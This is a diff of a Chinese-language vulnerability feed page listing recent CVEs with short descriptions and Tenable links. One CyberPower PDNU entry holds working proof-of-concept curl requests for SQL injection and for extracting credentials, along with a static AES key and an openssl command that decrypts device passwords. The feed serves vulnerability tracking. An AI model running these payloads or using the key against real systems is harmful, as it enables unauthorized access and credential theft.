@@ -1,4 +1,4 @@
-<!-- RELEASE TIME : 2024-05-11 03:26:04 -->
+<!-- RELEASE TIME : 2024-05-11 07:23:14 -->
 <html lang="zh-cn">
 
  <head>
@@ -284,6 +284,30 @@
        <th width="5%">URL</th>
       </tr>
       <tr>
+       <td>97091980c5e1b8458e4e6fa2fc74838e</td>
+       <td>CVE-2024-34360</td>
+       <td>2024-05-10 00:00:00 <img src="imgs/new.gif" /></td>
+       <td>Nodes can publish ATXs which reference the incorrect previous ATX of the Smesher that created the ATX. ATXs are expected to form a single chain from the newest to the first ATX ever published by an identity. Allowing Smeshers to reference an earlier (but not the latest) ATX as previous breaks this protocol rule and can serve as an attack vector where Nodes are rewarded for holding their PoST data for less than one epoch but still being eligible for rewards.</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-34360">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>f14b094a1f9177dc64e84fdbe5968b5c</td>
+       <td>CVE-2024-34349</td>
+       <td>2024-05-10 00:00:00 <img src="imgs/new.gif" /></td>
+       <td>There is a possibility to execute javascript code in the Admin panel. In order to perform an XSS attack input a script into Name field in which of the resources: Taxons, Products, Product Options or Product Variants. The code will be executed while using an autocomplete field with one of the listed entities in the Admin Panel. Also for the taxons in the category tree on the product form.</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-34349">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>903af0a69e5d47ff38f36d634b501944</td>
+       <td>CVE-2024-32964</td>
+       <td>2024-05-10 00:00:00 <img src="imgs/new.gif" /></td>
+       <td>SSRF ,All users will be impacted.</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-32964">详情</a></td>
+      </tr>
+
+      <tr>
        <td>a27d8e91cfe2d5d574808728ad8d7ea1</td>
        <td>CVE-2024-32739</td>
        <td>2024-05-09 14:39:13</td>
@@ -321,6 +345,22 @@
        <td>2024-05-09 14:39:13</td>
        <td>CVE-2024-32735 - Missing Authentication for Critical Function (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)An unauthenticated remote attacker can access the PDNU REST APIs. For example, the attacker can fetch sensitive information (i.e., login credentials) for devices managed by PDNU:curl '&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/devices' {"status":"success","results":[{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","fwversion":null,"netmask":"255.255.255.0","gateway":" \"192.168.1.1\"","usedhcp":false,"location":null,"name":null,"uptime":null,"code":null,"contact":null,"modifiedtime":null,"account":"admin","passwd":"FDA64FBAD708BA5A3CA9995A1153F4C6","iv":"90CC43284178CF848AA3CFE8C98B337C","canconn":true,"action":null,"ndtype":2}]}The encrypted password used to login (i.e., SSH) to a device can be decrypted with a static key (i.e., 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e):echo -n 'FDA64FBAD708BA5A3CA9995A1153F4C6' | xxd -p -r | openssl aes-256-cbc -d -K 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e -iv 90CC43284178CF848AA3CFE8C98B337C Password123Note that we do not a CyberPower device to be added to PDNU. &nbsp;We simulate "adding a device manually" with:a. Add a row to the devicesecret table in mcu.dbcurl -i -X PUT -H 'Content-Type:application/json' -d '{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","cmd":"submit_after_dry_run","acc":"admin","passwd":"Password123","connectionstatus":true}' "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/devices"b. Using the PDNU web UI, import a file with the following content, this would add a row to the rmcdevice table"Deivce Type","MAC Address","Version","Account","IP Address","DHCP","Time","Result","Up Time","Name","Location","Subnet Mask","Gateway" "2","11:22:33:44:55:66","2.2.7.0","","192.168.1.123","false", "1545027013","101","1348247500","PDU30SWT17ATNET","Server Room","255.255.255.0", "192.168.1.1" CVE-2024-32736 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_utask_verbose (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public UpdateVerboseStatusResp query_utask_verbose(String contract_uuid) throws DataAccessException { String q_str = String.format("select uaction, ip, mac, ts, reasoningcode from ucontract join utask on ucontract.ucid = utask.contract join utaskresult on utask.utid = utaskresult.task where ucontract.ucid = '%s';", new Object[] { contract_uuid }); return (UpdateVerboseStatusResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:# sqlite_version() = 3.21.0 curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/confup?mode=&amp;uid=1'%20UNION%20select%201,2,3,4,sqlite_version();--" {"status":"finished","results":[{"ip":"2","mac":"3","action":"1","ts":"4","code":"3.21.0"}]}CVE-2024-32737 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_contract_result (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public synchronized UpdateLeanStatusResp query_contract_result(String contract_uuid) throws DataAccessException { String q_str = String.format("select numofupgradedevice, numsuccess, numfailed, modifiedtime from ucontractresult where ucontractresult.contract = '%s';", new Object[] { contract_uuid }); return (UpdateLeanStatusResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/confup?mode=lean&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","result":{"processing":-4,"success":2,"failed":3,"modifiedtime":"3.21.0"}}CVE-2024-32738 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_ptask_lean (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public PdncConfigLeanResp query_ptask_lean(String contract_uuid) throws DataAccessException { String q_str = String.format("select numofdevice, numsuccess, numfailed, modifiedtime from pcontractresult where contract = '%s';", new Object[] { contract_uuid }); return (PdncConfigLeanResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/ndconfig?mode=lean&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","results":[{"processing":-4,"success":2,"failed":3,"modifiedtime":"3.21.0"}]}CVE-2024-32739 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_ptask_verbose (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public PdncConfigVerboseResp query_ptask_verbose(String contract_uuid) throws DataAccessException { String q_str = String.format("select paction, ip, ts, reasoningcode from pcontract join ptask on pcontract.pcid = ptask.contract join ptaskresult on ptask.ptid = ptaskresult.task where pcontract.pcid = '%s';", new Object[] { contract_uuid }); return (PdncConfigVerboseResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/ndconfig?mode=&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","results":[{"code":"3.21.0","action":"1","ip":"2","ts":"3"}]}&nbsp;</td>
        <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-32735">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>8eb2479f89c57f088e48ef780615db3c</td>
+       <td>CVE-2024-2454</td>
+       <td>2024-05-09 01:38:36</td>
+       <td>Uncontrolled Resource Consumption in GitLab</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-2454">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>35d0cf7a7877afdadfe9ffe99cf8f999</td>
+       <td>CVE-2024-2651</td>
+       <td>2024-05-09 01:38:31</td>
+       <td>Uncontrolled Resource Consumption in GitLab</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-2651">详情</a></td>
       </tr>
 
       <tr>
@@ -481,46 +521,6 @@
        <td>2024-05-08 02:15:09</td>
        <td>Incomplete fix for CVE-2024-1929 The problem with CVE-2024-1929 was that the dnf5 D-Bus daemon accepted arbitrary configuration parameters from unprivileged users, which allowed a local root exploit by tricking the daemon into loading a user controlled "plugin". All of this happened before Polkit authentication was even started. The dnf5 library code does not check whether non-root users control the directory in question. On one hand, this poses a Denial-of-Service attack vector by making the daemonoperate on a blocking file (e.g. named FIFO special file) or a very large file that causes an out-of-memory situation (e.g. /dev/zero). On the other hand, this can be used to let the daemon process privileged files like /etc/shadow. The file in question is parsed as an INI file. Error diagnostics resulting from parsing privileged files could cause information leaks, if these diagnostics are accessible to unprivileged users. In the case of libdnf5, no such user accessible diagnostics should exist, though. Also, a local attacker can place a valid repository configuration file in this directory. This configuration file allows to specify a plethora of additional configuration options. This makes various additional code paths in libdnf5 accessible to the attacker.</td>
        <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-2746">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>5aa7fe79f5f805d1b88b5ed25e66fc70</td>
-       <td>CVE-2024-1930</td>
-       <td>2024-05-08 02:15:09</td>
-       <td>No Limit on Number of Open Sessions / Bad Session Close Behaviour in dnf5daemon-server before 5.1.17 allows a malicious user to impact Availability via No Limit on Number of Open Sessions. There is no limit on how many sessions D-Bus clients may create using the `open_session()` D-Bus method. For each session a thread is created in dnf5daemon-server. This spends a couple of hundred megabytes of memory in the process. Further connections will become impossible, likely because no more threads can be spawned by the D-Bus service.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-1930">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>7b3a71c97d206d3b26244f96efd1cfc4</td>
-       <td>CVE-2024-1929</td>
-       <td>2024-05-08 02:15:09</td>
-       <td>Local Root Exploit via Configuration Dictionary in dnf5daemon-server before 5.1.17 allows a malicious user to impact Confidentiality and Integrity via Configuration Dictionary. There are issues with the D-Bus interface long before Polkit is invoked. The `org.rpm.dnf.v0.SessionManager.open_session` method takes a key/value map of configuration entries. A sub-entry in this map, placed under the "config" key, is another key/value map. The configuration values found in it will be forwarded as configuration overrides to the `libdnf5::Base` configuration. Practically all libdnf5 configuration aspects can be influenced here. Already when opening the session via D-Bus, the libdnf5 will be initialized using these override configuration values. There is no sanity checking of the content of this "config" map, which is untrusted data. It is possible to make the library loading a plug-in shared library under control of an unprivileged user, hence achieving root access.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-1929">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>52fa672bbd3a7f22a0f78fd08f91a0ee</td>
-       <td>CVE-2024-4456</td>
-       <td>2024-05-08 01:15:06</td>
-       <td>In affected versions of Octopus Server with certain access levels it was possible to embed a Cross-Site Scripting payload on the audit page.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-4456">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>ef976b03caaeb0cdf5fee42b6b02e889</td>
-       <td>CVE-2023-40490</td>
-       <td>2024-05-07 23:15:16</td>
-       <td>Maxon Cinema 4D SKP File Parsing Use-After-Free Remote Code Execution Vulnerability. This vulnerability allows remote attackers to execute arbitrary code on affected installations of Maxon Cinema 4D. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within the parsing of SKP files. The issue results from the lack of validating the existence of an object prior to performing operations on the object. An attacker can leverage this vulnerability to execute code in the context of the current process. Was ZDI-CAN-21438.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2023-40490">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>1e5dfcdbfb82e43fab4e5369d9a56145</td>
-       <td>CVE-2023-37325</td>
-       <td>2024-05-07 23:15:16</td>
-       <td>D-Link DAP-2622 DDP Set SSID List Missing Authentication Vulnerability. This vulnerability allows network-adjacent attackers to make unauthorized changes to device configuration on affected installations of D-Link DAP-2622 routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the DDP service. The issue results from the lack of authentication prior to allowing access to functionality. An attacker can leverage this vulnerability to manipulate wireless authentication settings. Was ZDI-CAN-20104.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2023-37325">详情</a></td>
       </tr>
 
      </tbody>
